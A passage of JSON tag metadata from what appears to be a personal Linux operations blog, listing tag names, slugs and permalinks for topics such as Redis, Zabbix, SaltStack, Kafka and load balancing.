CentOS7/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://garywu520.github.io/tags/Jenkins/"},{"name":"codis","slug":"codis","permalink":"https://garywu520.github.io/tags/codis/"},{"name":"codis集群","slug":"codis集群","permalink":"https://garywu520.github.io/tags/codis%E9%9B%86%E7%BE%A4/"},{"name":"memcache","slug":"memcache","permalink":"https://garywu520.github.io/tags/memcache/"},{"name":"SHELL","slug":"SHELL","permalink":"https://garywu520.github.io/tags/SHELL/"},{"name":".vimrc自动添加shell注释","slug":"vimrc自动添加shell注释","permalink":"https://garywu520.github.io/tags/vimrc%E8%87%AA%E5%8A%A8%E6%B7%BB%E5%8A%A0shell%E6%B3%A8%E9%87%8A/"},{"name":"lvs","slug":"lvs","permalink":"https://garywu520.github.io/tags/lvs/"},{"name":"负载均衡","slug":"负载均衡","permalink":"https://garywu520.github.io/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"},{"name":"keepalived","slug":"keepalived","permalink":"https://garywu520.github.io/tags/keepalived/"},{"name":"4层负载均衡","slug":"4层负载均衡","permalink":"https://garywu520.github.io/tags/4%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"},{"name":"DR模式","slug":"DR模式","permalink":"https://garywu520.github.io/tags/DR%E6%A8%A1%E5%BC%8F/"},{"name":"IM","slug":"IM","permalink":"https://garywu520.github.io/tags/IM/"},{"name":"企业IM","slug":"企业IM","permalink":"https://garywu520.github.io/tags/%E4%BC%81%E4%B8%9AIM/"},{"name":"开源IM","slug":"开源IM","permalink":"https://garywu520.github.io/tags/%E5%BC%80%E6%BA%90IM/"},{"name":"kafka broker","slug":"kafka-broker","permalink":"https://garywu520.github.io/tags/kafka-broker/"},{"name":"Producer","slug":"Producer","permalink":"https://garywu520.github.io/tags/Producer/"},{"name":"HA缓存","slug":"HA缓存","permalink":"https://garywu520.github.io/tags/HA%E7%BC%93%E5%AD%98/"},{"name":"leader Partition","slug":"leader-Partition","permalink":"https://garywu520.github.io/tags/leader-Partition/"},{"name":"follow partitions","slug":"follow-partitions","permalink":"https://garywu520.github.io/tags/follow-partitions/"},{"name":"RocketMQ","slug":"RocketMQ","permalink":"https://garywu520.github.io/tags/RocketMQ/"},{"name":"分布式消息队列","slug":"分布式消息队列","permalink":"https://garywu520.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"},{"name":"nameserver","slug":"nameserver","permalink":"https://garywu520.github.io/tags/nameserver/"},{"name":"brokerserver","slug":"brokerserver","permalink":"https://garywu520.github.io/tags/brokerserver/"},{"name":"SHELL编程","slug":"SHELL编程","permalink":"https://garywu520.github.io/tags/SHELL%E7%BC%96%E7%A8%8B/"},{"name":"Python","slug":"Python","permalink":"https://garywu520.github.io/tags/Python/"},{"name":"CentOS6","slug":"CentOS6","permalink":"https://garywu520.github.io/tags/CentOS6/"},{"name":"Python2.7","slug":"Python2-7","permalink":"https://garywu520.github.io/tags/Python2-7/"},{"name":"python27","slug":"python27","permalink":"https://garywu520.github.io/tags/python27/"},{"name":"python35","slug":"python35","permalink":"https://garywu520.github.io/tags/python35/"},{"name":"SCL","slug":"SCL","permalink":"https://garywu520.github.io/tags/SCL/"},{"name":"Consumer","slug":"Consumer","permalink":"https://garywu520.github.io/tags/Consumer/"},{"name":"TOPIC","slug":"TOPIC","permalink":"https://garywu520.github.io/tags/TOPIC/"},{"name":"Name Server","slug":"Name-Server","permalink":"https://garywu520.github.io/tags/Name-Server/"},{"name":"redis代理","slug":"redis代理","permalink":"https://garywu520.github.io/tags/redis%E4%BB%A3%E7%90%86/"},{"name":"memcache代理","slug":"memcache代理","permalink":"https://garywu520.github.io/tags/memcache%E4%BB%A3%E7%90%86/"},{"name":"Twitter","slug":"Twitter","permalink":"https://garywu520.github.io/tags/Twitter/"},{"name":"redis-benchmark","slug":"redis-benchmark","permalink":"https://garywu520.github.io/tags/redis-benchmark/"},{"name":"Twemproxy","slug":"Twemproxy","permalink":"https://garywu520.github.io/tags/Twemproxy/"},{"name":"zabbix-server","slug":"zabbix-server","permalink":"https://garywu520.github.io/tags/zabbix-server/"},{"name":"zabbix-agent","slug":"zabbix-agent","permalink":"https://garywu520.github.io/tags/zabbix-agent/"},{"name":"zabbix-proxy","slug":"zabbix-proxy","permalink":"https://garywu520.github.io/tags/zabbix-proxy/"},{"name":"zabbix windows","slug":"zabbix-windows","permalink":"https://garywu520.github.io/tags/zabbix-windows/"},{"name":"redis集群","slug":"redis集群","permalink":"https://garywu520.github.io/tags/redis%E9%9B%86%E7%BE%A4/"},{"name":"cluster","slug":"cluster","permalink":"https://garywu520.github.io/tags/cluster/"},{"name":"shadowsocks","slug":"shadowsocks","permalink":"https://garywu520.github.io/tags/shadowsocks/"},{"name":"shadowdns","slug":"shadowdns","permalink":"https://garywu520.github.io/tags/shadowdns/"},{"name":"加密代理","slug":"加密代理","permalink":"https://garywu520.github.io/tags/%E5%8A%A0%E5%AF%86%E4%BB%A3%E7%90%86/"},{"name":"NoSQL","slug":"NoSQL","permalink":"https://garywu520.github.io/tags/NoSQL/"},{"name":"web缓存","slug":"web缓存","permalink":"https://garywu520.github.io/tags/web%E7%BC%93%E5%AD%98/"},{"name":"非关系型数据库","slug":"非关系型数据库","permalink":"https://garywu520.github.io/tags/%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"Redis主从","slug":"Redis主从","permalink":"https://garywu520.github.io/tags/Redis%E4%B8%BB%E4%BB%8E/"},{"name":"redis-server","slug":"redis-server","permalink":"https://garywu520.github.io/tags/redis-server/"},{"name":"redis-cli","slug":"redis-cli","permalink":"https://garywu520.github.io/tags/redis-cli/"},{"name":"redis持久化","slug":"redis持久化","permalink":"https://garywu520.github.io/tags/redis%E6%8C%81%E4%B9%85%E5%8C%96/"},{"name":"AOF","slug":"AOF","permalink":"https://garywu520.github.io/tags/AOF/"},{"name":"snmp","slug":"snmp","permalink":"https://garywu520.github.io/tags/snmp/"},{"name":"agent","slug":"agent","permalink":"https://garywu520.github.io/tags/agent/"},{"name":"自定义key监控","slug":"自定义key监控","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%AE%9A%E4%B9%89key%E7%9B%91%E6%8E%A7/"},{"name":"图形乱码","slug":"图形乱码","permalink":"https://garywu520.github.io/tags/%E5%9B%BE%E5%BD%A2%E4%B9%B1%E7%A0%81/"},{"name":"saltstack","slug":"saltstack","permalink":"https://garywu520.github.io/tags/saltstack/"},{"name":"saltenv=prod","slug":"saltenv-prod","permalink":"https://garywu520.github.io/tags/saltenv-prod/"},{"name":"salt主机名判断","slug":"salt主机名判断","permalink":"https://garywu520.github.io/tags/salt%E4%B8%BB%E6%9C%BA%E5%90%8D%E5%88%A4%E6%96%AD/"},{"name":"salt-master高可用","slug":"salt-master高可用","permalink":"https://garywu520.github.io/tags/salt-master%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"name":"salt-API","slug":"salt-API","permalink":"https://garywu520.github.io/tags/salt-API/"},{"name":"salt-ssh","slug":"salt-ssh","permalink":"https://garywu520.github.io/tags/salt-ssh/"},{"name":"zabbix_agent","slug":"zabbix-agent","permalink":"https://garywu520.github.io/tags/zabbix-agent/"},{"name":"salt本地管理","slug":"salt本地管理","permalink":"https://garywu520.github.io/tags/salt%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86/"},{"name":"无master架构","slug":"无master架构","permalink":"https://garywu520.github.io/tags/%E6%97%A0master%E6%9E%B6%E6%9E%84/"},{"name":"include","slug":"include","permalink":"https://garywu520.github.io/tags/include/"},{"name":"salt job","slug":"salt-job","permalink":"https://garywu520.github.io/tags/salt-job/"},{"name":"cache mariadb","slug":"cache-mariadb","permalink":"https://garywu520.github.io/tags/cache-mariadb/"},{"name":"salt-run","slug":"salt-run","permalink":"https://garywu520.github.io/tags/salt-run/"},{"name":"minion_id","slug":"minion-id","permalink":"https://garywu520.github.io/tags/minion-id/"},{"name":"编译安装zabbix","slug":"编译安装zabbix","permalink":"https://garywu520.github.io/tags/%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85zabbix/"},{"name":"自定义脚本监控","slug":"自定义脚本监控","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E7%9B%91%E6%8E%A7/"},{"name":"jinja2","slug":"jinja2","permalink":"https://garywu520.github.io/tags/jinja2/"},{"name":"模板","slug":"模板","permalink":"https://garywu520.github.io/tags/%E6%A8%A1%E6%9D%BF/"},{"name":"salt命令格式","slug":"salt命令格式","permalink":"https://garywu520.github.io/tags/salt%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F/"},{"name":"salt执行模块","slug":"salt执行模块","permalink":"https://garywu520.github.io/tags/salt%E6%89%A7%E8%A1%8C%E6%A8%A1%E5%9D%97/"},{"name":"salt状态模块","slug":"salt状态模块","permalink":"https://garywu520.github.io/tags/salt%E7%8A%B6%E6%80%81%E6%A8%A1%E5%9D%97/"},{"name":"YAML格式规范","slug":"YAML格式规范","permalink":"https://garywu520.github.io/tags/YAML%E6%A0%BC%E5%BC%8F%E8%A7%84%E8%8C%83/"},{"name":"cmd.run","slug":"cmd-run","permalink":"https://garywu520.github.io/tags/cmd-run/"},{"name":"top.sls","slug":"top-sls","permalink":"https://garywu520.github.io/tags/top-sls/"},{"name":"require","slug":"require","permalink":"https://garywu520.github.io/tags/require/"},{"name":"watch","slug":"watch","permalink":"https://garywu520.github.io/tags/watch/"},{"name":"sls","slug":"sls","permalink":"https://garywu520.github.io/tags/sls/"},{"name":"confluence","slug":"confluence","permalink":"https://garywu520.github.io/tags/confluence/"},{"name":"mysql二进制安装","slug":"mysql二进制安装","permalink":"https://garywu520.github.io/tags/mysql%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E8%A3%85/"},{"name":"jdk二进制安装","slug":"jdk二进制安装","permalink":"https://garywu520.github.io/tags/jdk%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E8%A3%85/"},{"name":"团队协作","slug":"团队协作","permalink":"https://garywu520.github.io/tags/%E5%9B%A2%E9%98%9F%E5%8D%8F%E4%BD%9C/"},{"name":"ntp漏洞","slug":"ntp漏洞","permalink":"https://garywu520.github.io/tags/ntp%E6%BC%8F%E6%B4%9E/"},{"name":"漏洞修复","slug":"漏洞修复","permalink":"https://garywu520.github.io/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/"},{"name":"补丁升级","slug":"补丁升级","permalink":"https://garywu520.github.io/tags/%E8%A1%A5%E4%B8%81%E5%8D%87%E7%BA%A7/"},{"name":"自动化部署","slug":"自动化部署","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/"},{"name":"多实例","slug":"多实例","permalink":"https://garywu520.github.io/tags/%E5%A4%9A%E5%AE%9E%E4%BE%8B/"},{"name":"双主","slug":"双主","permalink":"https://garywu520.github.io/tags/%E5%8F%8C%E4%B8%BB/"},{"name":"脑裂","slug":"脑裂","permalink":"https://garywu520.github.io/tags/%E8%84%91%E8%A3%82/"},{"name":"murder","slug":"murder","permalink":"https://garywu520.github.io/tags/murder/"},{"name":"软件分发","slug":"软件分发","permalink":"https://garywu520.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%88%86%E5%8F%91/"},{"name":"P2P分发","slug":"P2P分发","permalink":"https://garywu520.github.io/tags/P2P%E5%88%86%E5%8F%91/"},{"name":"FastCGI","slug":"FastCGI","permalink":"https://garywu520.github.io/tags/FastCGI/"},{"name":"ssdb","slug":"ssdb","permalink":"https://garywu520.github.io/tags/ssdb/"},{"name":"LevelDB","slug":"LevelDB","permalink":"https://garywu520.github.io/tags/LevelDB/"},{"name":"磁盘挂载","slug":"磁盘挂载","permalink":"https://garywu520.github.io/tags/%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/"},{"name":"fstab","slug":"fstab","permalink":"https://garywu520.github.io/tags/fstab/"},{"name":"开机挂载","slug":"开机挂载","permalink":"https://garywu520.github.io/tags/%E5%BC%80%E6%9C%BA%E6%8C%82%E8%BD%BD/"},{"name":"网卡","slug":"网卡","permalink":"https://garywu520.github.io/tags/%E7%BD%91%E5%8D%A1/"},{"name":"子接口","slug":"子接口","permalink":"https://garywu520.github.io/tags/%E5%AD%90%E6%8E%A5%E5%8F%A3/"},{"name":"分布式存储","slug":"分布式存储","permalink":"https://garywu520.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%98%E5%82%A8/"},{"name":"GlusterFS","slug":"GlusterFS","permalink":"https://garywu520.github.io/tags/GlusterFS/"},{"name":"SAN","slug":"SAN","permalink":"https://garywu520.github.io/tags/SAN/"},{"name":"NAS","slug":"NAS","permalink":"https://garywu520.github.io/tags/NAS/"},{"name":"pass_proxy","slug":"pass-proxy","permalink":"https://garywu520.github.io/tags/pass-proxy/"},{"name":"ruby","slug":"ruby","permalink":"https://garywu520.github.io/tags/ruby/"},{"name":"redis cluster","slug":"redis-cluster","permalink":"https://garywu520.github.io/tags/redis-cluster/"},{"name":"give","slug":"give","permalink":"https://garywu520.github.io/tags/give/"},{"name":"maintenance","slug":"maintenance","permalink":"https://garywu520.github.io/tags/maintenance/"},{"name":"Control","slug":"Control","permalink":"https://garywu520.github.io/tags/Control/"},{"name":"系统修复","slug":"系统修复","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E4%BF%AE%E5%A4%8D/"},{"name":"cpu","slug":"cpu","permalink":"https://garywu520.github.io/tags/cpu/"},{"name":"taskset","slug":"taskset","permalink":"https://garywu520.github.io/tags/taskset/"},{"name":"PID","slug":"PID","permalink":"https://garywu520.github.io/tags/PID/"},{"name":"favicon.ico","slug":"favicon-ico","permalink":"https://garywu520.github.io/tags/favicon-ico/"},{"name":"access","slug":"access","permalink":"https://garywu520.github.io/tags/access/"},{"name":"opcache","slug":"opcache","permalink":"https://garywu520.github.io/tags/opcache/"},{"name":"性能加速","slug":"性能加速","permalink":"https://garywu520.github.io/tags/%E6%80%A7%E8%83%BD%E5%8A%A0%E9%80%9F/"},{"name":"tmpfs","slug":"tmpfs","permalink":"https://garywu520.github.io/tags/tmpfs/"},{"name":"RM","slug":"RM","permalink":"https://garywu520.github.io/tags/RM/"},{"name":"Mysql","slug":"Mysql","permalink":"https://garywu520.github.io/tags/Mysql/"},{"name":"内存文件系统","slug":"内存文件系统","permalink":"https://garywu520.github.io/tags/%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"阵列卡","slug":"阵列卡","permalink":"https://garywu520.github.io/tags/%E9%98%B5%E5%88%97%E5%8D%A1/"},{"name":"缓存","slug":"缓存","permalink":"https://garywu520.github.io/tags/%E7%BC%93%E5%AD%98/"},{"name":"buffer","slug":"buffer","permalink":"https://garywu520.github.io/tags/buffer/"},{"name":"读缓存","slug":"读缓存","permalink":"https://garywu520.github.io/tags/%E8%AF%BB%E7%BC%93%E5%AD%98/"},{"name":"写缓冲","slug":"写缓冲","permalink":"https://garywu520.github.io/tags/%E5%86%99%E7%BC%93%E5%86%B2/"},{"name":"LNMP","slug":"LNMP","permalink":"https://garywu520.github.io/tags/LNMP/"},{"name":"LAMP","slug":"LAMP","permalink":"https://garywu520.github.io/tags/LAMP/"},{"name":"LNMP编译","slug":"LNMP编译","permalink":"https://garywu520.github.io/tags/LNMP%E7%BC%96%E8%AF%91/"},{"name":"wordpress","slug":"wordpress","permalink":"https://garywu520.github.io/tags/wordpress/"},{"name":"mysql数据库迁移","slug":"mysql数据库迁移","permalink":"https://garywu520.github.io/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%81%E7%A7%BB/"},{"name":"apache","slug":"apache","permalink":"https://garywu520.github.io/tags/apache/"},{"name":"htpasswd","slug":"htpasswd","permalink":"https://garywu520.github.io/tags/htpasswd/"},{"name":"日志切割","slug":"日志切割","permalink":"https://garywu520.github.io/tags/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2/"},{"name":"dns","slug":"dns","permalink":"https://garywu520.github.io/tags/dns/"},{"name":"dr","slug":"dr","permalink":"https://garywu520.github.io/tags/dr/"},{"name":"dns主从","slug":"dns主从","permalink":"https://garywu520.github.io/tags/dns%E4%B8%BB%E4%BB%8E/"},{"name":"集群","slug":"集群","permalink":"https://garywu520.github.io/tags/%E9%9B%86%E7%BE%A4/"},{"name":"VRRP","slug":"VRRP","permalink":"https://garywu520.github.io/tags/VRRP/"},{"name":"http","slug":"http","permalink":"https://garywu520.github.io/tags/http/"},{"name":"URL","slug":"URL","permalink":"https://garywu520.github.io/tags/URL/"},{"name":"URI","slug":"URI","permalink":"https://garywu520.github.io/tags/URI/"},{"name":"web","slug":"web","permalink":"https://garywu520.github.io/tags/web/"},{"name":"tmux","slug":"tmux","permalink":"https://garywu520.github.io/tags/tmux/"},{"name":"会话","slug":"会话","permalink":"https://garywu520.github.io/tags/%E4%BC%9A%E8%AF%9D/"},{"name":"weathermap","slug":"weathermap","permalink":"https://garywu520.github.io/tags/weathermap/"},{"name":"plugin","slug":"plugin","permalink":"https://garywu520.github.io/tags/plugin/"},{"name":"memcached","slug":"memcached","permalink":"https://garywu520.github.io/tags/memcached/"},{"name":"IT","slug":"IT","permalink":"https://garywu520.github.io/tags/IT/"},{"name":"ITIL","slug":"ITIL","permalink":"https://garywu520.github.io/tags/ITIL/"},{"name":"PPT","slug":"PPT","permalink":"https://garywu520.github.io/tags/PPT/"},{"name":"剧本","slug":"剧本","permalink":"https://garywu520.github.io/tags/%E5%89%A7%E6%9C%AC/"},{"name":"playbooks","slug":"playbooks","permalink":"https://garywu520.github.io/tags/playbooks/"},{"name":"批量自动化管理","slug":"批量自动化管理","permalink":"https://garywu520.github.io/tags/%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E7%AE%A1%E7%90%86/"},{"name":"dsa","slug":"dsa","permalink":"https://garywu520.github.io/tags/dsa/"},{"name":"密钥","slug":"密钥","permalink":"https://garywu520.github.io/tags/%E5%AF%86%E9%92%A5/"},{"name":"认证","slug":"认证","permalink":"https://garywu520.github.io/tags/%E8%AE%A4%E8%AF%81/"},{"name":"免密登陆","slug":"免密登陆","permalink":"https://garywu520.github.io/tags/%E5%85%8D%E5%AF%86%E7%99%BB%E9%99%86/"},{"name":"cobbler","slug":"cobbler","permalink":"https://garywu520.github.io/tags/cobbler/"},{"name":"kickstart","slug":"kickstart","permalink":"https://garywu520.github.io/tags/kickstart/"},{"name":"ks","slug":"ks","permalink":"https://garywu520.github.io/tags/ks/"},{"name":"系统批量安装","slug":"系统批量安装","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%89%B9%E9%87%8F%E5%AE%89%E8%A3%85/"},{"name":"TCP","slug":"TCP","permalink":"https://garywu520.github.io/tags/TCP/"},{"name":"socket","slug":"socket","permalink":"https://garywu520.github.io/tags/socket/"},{"name":"优化","slug":"优化","permalink":"https://garywu520.github.io/tags/%E4%BC%98%E5%8C%96/"},{"name":"ulimit","slug":"ulimit","permalink":"https://garywu520.github.io/tags/ulimit/"},{"name":"tcp_nopush","slug":"tcp-nopush","permalink":"https://garywu520.github.io/tags/tcp-nopush/"},{"name":"tcp_nodelay","slug":"tcp-nodelay","permalink":"https://garywu520.github.io/tags/tcp-nodelay/"},{"name":"100M","slug":"100M","permalink":"https://garywu520.github.io/tags/100M/"},{"name":"流量不准","slug":"流量不准","permalink":"https://garywu520.github.io/tags/%E6%B5%81%E9%87%8F%E4%B8%8D%E5%87%86/"},{"name":"套接字","slug":"套接字","permalink":"https://garywu520.github.io/tags/%E5%A5%97%E6%8E%A5%E5%AD%97/"},{"name":"firebug","slug":"firebug","permalink":"https://garywu520.github.io/tags/firebug/"},{"name":"五元组","slug":"五元组","permalink":"https://garywu520.github.io/tags/%E4%BA%94%E5%85%83%E7%BB%84/"},{"name":"OSI7层网络模型","slug":"OSI7层网络模型","permalink":"https://garywu520.github.io/tags/OSI7%E5%B1%82%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/"},{"name":"OSI","slug":"OSI","permalink":"https://garywu520.github.io/tags/OSI/"},{"name":"网络模型","slug":"网络模型","permalink":"https://garywu520.github.io/tags/%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/"},{"name":"底层核心","slug":"底层核心","permalink":"https://garywu520.github.io/tags/%E5%BA%95%E5%B1%82%E6%A0%B8%E5%BF%83/"},{"name":"三次握手","slug":"三次握手","permalink":"https://garywu520.github.io/tags/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B/"},{"name":"四次挥手","slug":"四次挥手","permalink":"https://garywu520.github.io/tags/%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B/"},{"name":"telnet","slug":"telnet","permalink":"https://garywu520.github.io/tags/telnet/"},{"name":"sersync","slug":"sersync","permalink":"https://garywu520.github.io/tags/sersync/"},{"name":"实时同步","slug":"实时同步","permalink":"https://garywu520.github.io/tags/%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5/"},{"name":"sync","slug":"sync","permalink":"https://garywu520.github.io/tags/sync/"},{"name":"inotify","slug":"inotify","permalink":"https://garywu520.github.io/tags/inotify/"},{"name":"DNS性能瓶颈","slug":"DNS性能瓶颈","permalink":"https://garywu520.github.io/tags/DNS%E6%80%A7%E8%83%BD%E7%93%B6%E9%A2%88/"},{"name":"unbound","slug":"unbound","permalink":"https://garywu520.github.io/tags/unbound/"},{"name":"NSD","slug":"NSD","permalink":"https://garywu520.github.io/tags/NSD/"},{"name":"Error1044","slug":"Error1044","permalink":"https://garywu520.github.io/tags/Error1044/"},{"name":"只读模式","slug":"只读模式","permalink":"https://garywu520.github.io/tags/%E5%8F%AA%E8%AF%BB%E6%A8%A1%E5%BC%8F/"},{"name":"fatab","slug":"fatab","permalink":"https://garywu520.github.io/tags/fatab/"},{"name":"mount","slug":"mount","permalink":"https://garywu520.github.io/tags/mount/"},{"name":"remount","slug":"remount","permalink":"https://garywu520.github.io/tags/remount/"},{"name":"fastdfs","slug":"fastdfs","permalink":"https://garywu520.github.io/tags/fastdfs/"},{"name":"nfs","slug":"nfs","permalink":"https://garywu520.github.io/tags/nfs/"},{"name":"exit退出码","slug":"exit退出码","permalink":"https://garywu520.github.io/tags/exit%E9%80%80%E5%87%BA%E7%A0%81/"},{"name":"ip自动配置","slug":"ip自动配置","permalink":"https://garywu520.github.io/tags/ip%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE/"},{"name":"PXE","slug":"PXE","permalink":"https://garywu520.github.io/tags/PXE/"},{"name":"Cobbler","slug":"Cobbler","permalink":"https://garywu520.github.io/tags/Cobbler/"},{"name":"tar","slug":"tar","permalink":"https://garywu520.github.io/tags/tar/"},{"name":"目录浏览","slug":"目录浏览","permalink":"https://garywu520.github.io/tags/%E7%9B%AE%E5%BD%95%E6%B5%8F%E8%A7%88/"},{"name":"NAT","slug":"NAT","permalink":"https://garywu520.github.io/tags/NAT/"},{"name":"flume","slug":"flume","permalink":"https://garywu520.github.io/tags/flume/"},{"name":"kafka生产消费","slug":"kafka生产消费","permalink":"https://garywu520.github.io/tags/kafka%E7%94%9F%E4%BA%A7%E6%B6%88%E8%B4%B9/"},{"name":"lua nginx","slug":"lua-nginx","permalink":"https://garywu520.github.io/tags/lua-nginx/"},{"name":"vmware","slug":"vmware","permalink":"https://garywu520.github.io/tags/vmware/"},{"name":"虚拟机克隆","slug":"虚拟机克隆","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%85%8B%E9%9A%86/"},{"name":"备份","slug":"备份","permalink":"https://garywu520.github.io/tags/%E5%A4%87%E4%BB%BD/"},{"name":"round-robin轮询","slug":"round-robin轮询","permalink":"https://garywu520.github.io/tags/round-robin%E8%BD%AE%E8%AF%A2/"},{"name":"least-connected最少连接","slug":"least-connected最少连接","permalink":"https://garywu520.github.io/tags/least-connected%E6%9C%80%E5%B0%91%E8%BF%9E%E6%8E%A5/"},{"name":"ip-hash","slug":"ip-hash","permalink":"https://garywu520.github.io/tags/ip-hash/"},{"name":"双机热备","slug":"双机热备","permalink":"https://garywu520.github.io/tags/%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/"},{"name":"Cacti","slug":"Cacti","permalink":"https://garywu520.github.io/tags/Cacti/"},{"name":"告警","slug":"告警","permalink":"https://garywu520.github.io/tags/%E5%91%8A%E8%AD%A6/"},{"name":"期中架构","slug":"期中架构","permalink":"https://garywu520.github.io/tags/%E6%9C%9F%E4%B8%AD%E6%9E%B6%E6%9E%84/"},{"name":"Linux路由转发","slug":"Linux路由转发","permalink":"https://garywu520.github.io/tags/Linux%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91/"},{"name":"跨网段通信","slug":"跨网段通信","permalink":"https://garywu520.github.io/tags/%E8%B7%A8%E7%BD%91%E6%AE%B5%E9%80%9A%E4%BF%A1/"},{"name":"网络","slug":"网络","permalink":"https://garywu520.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"IP划分","slug":"IP划分","permalink":"https://garywu520.github.io/tags/IP%E5%88%92%E5%88%86/"},{"name":"备份服务","slug":"备份服务","permalink":"https://garywu520.github.io/tags/%E5%A4%87%E4%BB%BD%E6%9C%8D%E5%8A%A1/"},{"name":"web服务","slug":"web服务","permalink":"https://garywu520.github.io/tags/web%E6%9C%8D%E5%8A%A1/"},{"name":"批量管理","slug":"批量管理","permalink":"https://garywu520.github.io/tags/%E6%89%B9%E9%87%8F%E7%AE%A1%E7%90%86/"},{"name":"for循环","slug":"for循环","permalink":"https://garywu520.github.io/tags/for%E5%BE%AA%E7%8E%AF/"},{"name":"while循环","slug":"while循环","permalink":"https://garywu520.github.io/tags/while%E5%BE%AA%E7%8E%AF/"},{"name":"until循环","slug":"until循环","permalink":"https://garywu520.github.io/tags/until%E5%BE%AA%E7%8E%AF/"},{"name":"select循环","slug":"select循环","permalink":"https://garywu520.github.io/tags/select%E5%BE%AA%E7%8E%AF/"},{"name":"Ansible","slug":"Ansible","permalink":"https://garywu520.github.io/tags/Ansible/"},{"name":"模块","slug":"模块","permalink":"https://garywu520.github.io/tags/%E6%A8%A1%E5%9D%97/"},{"name":"socket.gaierror","slug":"socket-gaierror","permalink":"https://garywu520.github.io/tags/socket-gaierror/"},{"name":"awk数组","slug":"awk数组","permalink":"https://garywu520.github.io/tags/awk%E6%95%B0%E7%BB%84/"},{"name":"磁盘管理","slug":"磁盘管理","permalink":"https://garywu520.github.io/tags/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"},{"name":"YARN","slug":"YARN","permalink":"https://garywu520.github.io/tags/YARN/"},{"name":"NodeManager","slug":"NodeManager","permalink":"https://garywu520.github.io/tags/NodeManager/"},{"name":"Vcores","slug":"Vcores","permalink":"https://garywu520.github.io/tags/Vcores/"},{"name":"DRF","slug":"DRF","permalink":"https://garywu520.github.io/tags/DRF/"},{"name":"磁盘","slug":"磁盘","permalink":"https://garywu520.github.io/tags/%E7%A3%81%E7%9B%98/"},{"name":"Apache","slug":"Apache","permalink":"https://garywu520.github.io/tags/Apache/"},{"name":"web认证","slug":"web认证","permalink":"https://garywu520.github.io/tags/web%E8%AE%A4%E8%AF%81/"},{"name":"Dell","slug":"Dell","permalink":"https://garywu520.github.io/tags/Dell/"},{"name":"RAID5","slug":"RAID5","permalink":"https://garywu520.github.io/tags/RAID5/"},{"name":"知识点回顾","slug":"知识点回顾","permalink":"https://garywu520.github.io/tags/%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE/"},{"name":"egrep","slug":"egrep","permalink":"https://garywu520.github.io/tags/egrep/"},{"name":"sed","slug":"sed","permalink":"https://garywu520.github.io/tags/sed/"},{"name":"awk","slug":"awk","permalink":"https://garywu520.github.io/tags/awk/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://garywu520.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"Yum源","slug":"Yum源","permalink":"https://garywu520.github.io/tags/Yum%E6%BA%90/"},{"name":"脚本","slug":"脚本","permalink":"https://garywu520.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"Ganglia","slug":"Ganglia","permalink":"https://garywu520.github.io/tags/Ganglia/"},{"name":"无字书","slug":"无字书","permalink":"https://garywu520.github.io/tags/%E6%97%A0%E5%AD%97%E4%B9%A6/"},{"name":"杯子取水","slug":"杯子取水","permalink":"https://garywu520.github.io/tags/%E6%9D%AF%E5%AD%90%E5%8F%96%E6%B0%B4/"},{"name":"系统权限","slug":"系统权限","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://garywu520.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"403漏洞","slug":"403漏洞","permalink":"https://garywu520.github.io/tags/403%E6%BC%8F%E6%B4%9E/"},{"name":"Typora","slug":"Typora","permalink":"https://garywu520.github.io/tags/Typora/"},{"name":"MarkDown","slug":"MarkDown","permalink":"https://garywu520.github.io/tags/MarkDown/"},{"name":"logrotate","slug":"logrotate","permalink":"https://garywu520.github.io/tags/logrotate/"},{"name":"日志","slug":"日志","permalink":"https://garywu520.github.io/tags/%E6%97%A5%E5%BF%97/"},{"name":"切割","slug":"切割","permalink":"https://garywu520.github.io/tags/%E5%88%87%E5